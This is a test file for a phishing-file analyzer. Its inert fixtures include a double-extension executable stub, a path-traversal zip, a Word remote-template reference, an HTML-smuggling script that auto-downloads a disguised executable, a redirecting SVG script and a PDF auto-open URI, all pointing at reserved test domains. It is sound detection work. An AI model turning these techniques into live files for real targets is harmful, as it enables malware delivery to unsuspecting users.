"""Tests for the file analyzer. All fixtures are synthetic and inert (reserved domains)."""

from __future__ import annotations

import base64
import io
import struct
import zipfile

import pytest

import uniphish.analyzers.file as fmod
from uniphish.analyzers.file import FileAnalyzer
from uniphish.core.analyzer import REGISTRY, AnalysisContext, AnalysisOptions
from uniphish.core.types import Artifact, ArtifactKind, IndicatorType


def run(data: bytes, filename: str | None = None, parent: Artifact | None = None):
    art = Artifact.from_file(data, filename)
    ctx = AnalysisContext(options=AnalysisOptions(), parent=parent)
    return art, FileAnalyzer().analyze_sync(art, ctx)


def ids(res) -> set[str]:
    return {s.id for s in res.signals}


def sig(res, sid):
    return next(s for s in res.signals if s.id == sid)


def pe_stub(pad: int = 64) -> bytes:
    hdr = bytearray(b"MZ" + b"\x00" * 62)
    hdr[0x3C:0x40] = struct.pack("<I", 0x40)
    return bytes(hdr) + b"PE\x00\x00" + b"\x00" * pad


def make_zip(entries: dict[str, bytes], *, encrypt_flag: bool = False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
    data = buf.getvalue()
    if encrypt_flag:
        b = bytearray(data)
        for marker, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            i = 0
            while (i := b.find(marker, i)) >= 0:
                b[i + off] |= 0x01
                i += 4
        data = bytes(b)
    return data


def test_registered_and_declared():
    assert REGISTRY["file"] is FileAnalyzer
    a = FileAnalyzer
    assert a.kinds == frozenset({ArtifactKind.FILE}) and a.blocking and a.stage == 0
    assert "qr.url_in_image" in a.signals
    for code in fmod.INDICATOR_CATALOG:
        assert code in a.signals
    assert all(len(t) <= 70 for t in a.signals.values())


def test_double_extension_exe():
    art, res = run(pe_stub(), "invoice.pdf.exe")
    assert {"file.double_extension", "file.type.executable"} <= ids(res)
    s = sig(res, "file.double_extension")
    assert s.category == "file" and s.weight > 0 and "T1036.007" in s.mitre
    assert res.meta["detected_type"] in {"pe", "dos"} and res.meta["double_extension"]
    types = {(i.type, i.value) for i in res.indicators}
    assert (IndicatorType.FILENAME, "invoice.pdf.exe") in types
    assert (IndicatorType.SHA256, art.sha256) in types
    assert res.meta["sha256"] == art.sha256


def test_disguised_exe_ext_mismatch_meta():
    _, res = run(pe_stub(), "statement.pdf")
    assert "file.disguised_executable" in ids(res) and res.meta["ext_mismatch"] is True


def test_encrypted_traversal_zip():
    inner = make_zip({"a.txt": b"hi"})
    z = make_zip({"../../evil.txt": b"x", "nested.zip": inner}, encrypt_flag=True)
    _, res = run(z, "docs.zip")
    assert {"file.archive.encrypted", "file.archive.path_traversal",
            "file.archive.nested"} <= ids(res)
    assert any("mark-of-the-web" in n for n in res.meta["file_notes"])


def test_macro_doc_remote_template_child():
    rel = (b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/'
           b'relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/'
           b'officeDocument/2006/relationships/attachedTemplate" '
           b'Target="https://tpl.example.test/t.dotm" TargetMode="External"/></Relationships>')
    d = make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>",
                  "word/_rels/settings.xml.rels": rel})
    art, res = run(d, "report.docx")
    assert "file.office.remote_template" in ids(res)
    kids = [c for c in res.children if c.origin == "file.url"]
    assert [c.url for c in kids] == ["https://tpl.example.test/t.dotm"]
    assert kids[0].parent_id == art.id
    assert (IndicatorType.DOMAIN, "tpl.example.test") in {(i.type, i.value) for i in res.indicators}


def test_html_smuggling():
    blob = base64.b64encode(pe_stub(pad=2000)).decode()
    html = (f"<html><script>var d='{blob}';var b=new Blob([atob(d)]);"
            "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
            "a.download='doc.exe';a.click();</script></html>")
    _, res = run(html.encode(), "view.html")
    assert {"file.html.smuggling.payload", "file.html.smuggling.pattern"} <= ids(res)
    assert "T1027.006" in sig(res, "file.html.smuggling.payload").mitre


def test_svg_script_and_children():
    svg = (b'<svg xmlns="http://www.w3.org/2000/svg" onload="x()"><script>'
           b'window.location="https://redir.example.test/a"</script>'
           b'<image href="https://img.example.test/logo.png"/></svg>')
    _, res = run(svg, "doc.svg")
    assert "file.svg.script" in ids(res)
    urls = {c.url for c in res.children}
    assert "https://redir.example.test/a" in urls
    assert not any("w3.org" in u for u in urls)


def test_pdf_openaction_uri_child():
    pdf = (b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>endobj\n"
           b"2 0 obj<</S/URI/URI(https://pay.example.test/now)>>endobj\n")
    _, res = run(pdf, "inv.pdf")
    assert {"file.pdf.open_action", "file.pdf.uri"} <= ids(res)
    assert [c.url for c in res.children] == ["https://pay.example.test/now"]
    assert all(c.origin == "file.url" for c in res.children)


def test_clean_text_file_is_quiet():
    _, res = run(b"just some notes", "notes.txt")
    assert res.signals == [] and res.children == []
    assert {i.type for i in res.indicators} >= {IndicatorType.SHA256, IndicatorType.MD5}


def test_garbage_does_not_raise():
    _, res = run(b"\x00\xff" * 100, None)
    assert "filename" not in res.meta and res.meta["size"] == 200


def test_applies_requires_content():
    a = Artifact(ArtifactKind.FILE)
    ctx = AnalysisContext(options=AnalysisOptions())
    assert FileAnalyzer().applies(a, ctx) is False


async def test_async_analyze_through_thread():
    art = Artifact.from_file(pe_stub(), "x.pdf.exe")
    res = await FileAnalyzer().analyze(art, AnalysisContext(options=AnalysisOptions()))
    assert "file.double_extension" in ids(res)


# ------------------------------------------------------------------ QR / quishing
try:
    import cv2
    import numpy  # noqa: F401
    HAVE_CV = True
except Exception:  # pragma: no cover
    HAVE_CV = False

needs_cv = pytest.mark.skipif(not HAVE_CV, reason="OpenCV not installed")


def make_qr(text: str, scale: int = 8, border: int = 4) -> bytes:
    q = cv2.QRCodeEncoder.create().encode(text)
    q = cv2.resize(q, None, fx=scale, fy=scale, interpolation=cv2.INTER_NEAREST)
    q = cv2.copyMakeBorder(q, border * scale, border * scale, border * scale, border * scale,
                           cv2.BORDER_CONSTANT, value=255)
    ok, buf = cv2.imencode(".png", q)
    assert ok
    return buf.tobytes()


@needs_cv
def test_qr_png_child_url_email_context():
    parent = Artifact.from_email(b"Subject: x\r\n\r\nbody")
    art, res = run(make_qr("https://login.example.test/verify?id=7"), "scan.png", parent)
    s = sig(res, "qr.url_in_image")
    assert s.weight == 1.0 and s.category == "file"
    kids = [c for c in res.children if c.origin == "qr"]
    assert [c.url for c in kids] == ["https://login.example.test/verify?id=7"]
    assert kids[0].parent_id == art.id
    assert res.meta["qr_urls"] == ["https://login.example.test/verify?id=7"]
    assert (IndicatorType.DOMAIN, "login.example.test") in {(i.type, i.value)
                                                            for i in res.indicators}


@needs_cv
def test_qr_standalone_weaker_and_non_url_ignored():
    _, res = run(make_qr("https://a.example.test/x"), "q.png")
    assert sig(res, "qr.url_in_image").weight < 1.0
    _, res2 = run(make_qr("just plain text"), "t.png")
    assert "qr.url_in_image" not in ids(res2) and not res2.children


@needs_cv
def test_qr_skipped_without_opencv(monkeypatch):
    monkeypatch.setattr(fmod, "qr_available", lambda: False)
    _, res = run(make_qr("https://a.example.test/x"), "q.png")
    assert "qr.url_in_image" not in ids(res)
    assert any("OpenCV" in n for n in res.meta["file_notes"])
